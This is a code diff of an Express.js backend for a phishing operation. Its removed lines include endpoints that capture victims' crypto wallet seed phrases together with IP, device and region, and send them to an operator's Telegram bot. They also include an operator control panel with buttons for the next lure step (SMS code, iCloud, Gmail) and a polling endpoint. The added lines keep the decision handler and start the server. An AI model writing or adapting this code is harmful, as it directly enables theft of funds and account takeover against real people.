-app.post("/wallet-phrase", async (req, res) => {
-  try {
-    const { phrase, userId, email } = req.body;
-
-    if (!phrase) {
-      return res.status(400).json({ error: "Missing phrase" });
-    }
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `💰💰💰💰 <b>Wallet - Phrases</b> 💰💰💰💰\n` +
-      `<b>📝 Phrases:</b>\n` +
-      `<code>${phrase}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-
-    console.log(`✅ Wallet phrase message sent`);
-    res.json({ ok: true });
-  } catch (err) {
-    console.error("❌ Wallet phrase error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ POST /wallet-decision - Wallet Decision Page Endpoint
-app.post("/wallet-decision", async (req, res) => {
-  try {
-    const { userId, email } = req.body;
-
-    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
-      req.headers["x-real-ip"] ||
-      req.connection.remoteAddress ||
-      "Unknown IP";
-
-    const userAgent = req.get("user-agent") || "Unknown";
-    const device = detectDevice(userAgent);
-    const region = await detectRegion(ip);
-
-    const message =
-      `💰💰💰 <b>Wallet - Decision</b> 💰💰💰\n` +
-      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>🌍 Region:</b> ${region}\n` +
-      `<b>💻 Device:</b> ${device}\n` +
-      `<b>📍 IP:</b> ${ip}`;
-
-    const botToken = process.env.BOT_TOKEN;
-    const chatId = process.env.ADMIN_CHAT_ID;
-
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: "💬 SMS - 2 💬", callback_data: `wallet_decision_sms|${email}` }],
-            [{ text: "🏁 Done 🏁", callback_data: `wallet_decision_done|${email}` }],
-            [
-              { text: "☁️", callback_data: `wallet_decision_icloud|${email}` },
-              { text: "🌈", callback_data: `wallet_decision_gmail|${email}` }
-            ]
-          ]
-        }
-      })
-    });
-
-    console.log(`✅ Wallet decision message sent`);
-    res.json({ ok: true });
-  } catch (err) {
-    console.error("❌ Wallet decision error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-// ✅ Storage for wallet decision choices
-const pendingWalletDecisions = {};
-
-// ✅ POST /update-wallet-decision - Update wallet decision choice
 app.post("/update-wallet-decision", (req, res) => {
   try {
     const { email, choice } = req.body;
+
     if (!email || !choice) {
       return res.status(400).json({ error: "Missing email or choice" });
     }
-    pendingWalletDecisions[email] = choice;
-    console.log(`✅ Wallet decision updated: ${email} → ${choice}`);
+
+    if (!pendingWalletDecision[email]) {
+      pendingWalletDecision[email] = {};
+    }
+
+    pendingWalletDecision[email].choice = choice;
+    pendingWalletDecision[email].updatedAt = Date.now();
+
+    console.log(`✅ Wallet decision updated: ${choice}`);
     res.json({ ok: true });
+
   } catch (err) {
     console.error("❌ Update wallet decision error:", err);
     res.status(500).json({ error: "Internal server error" });
   }
 });
 
-// ✅ GET /check-wallet-decision/:email - Check wallet decision choice
-app.get("/check-wallet-decision/:email", (req, res) => {
-  try {
-    const { email } = req.params;
-    const choice = pendingWalletDecisions[email];
-    if (choice) {
-      delete pendingWalletDecisions[email];
-      res.json({ choice });
-    } else {
-      res.json({ choice: null });
-    }
-  } catch (err) {
-    console.error("❌ Check wallet decision error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
+// ============================================================================
+// Start server
+// ============================================================================
+
+const server = app.listen(PORT, () => {
+  console.log(`✅ Backend running on port ${PORT}`);
+  startSelfPing();
 });
+
+module.exports = { app, server };
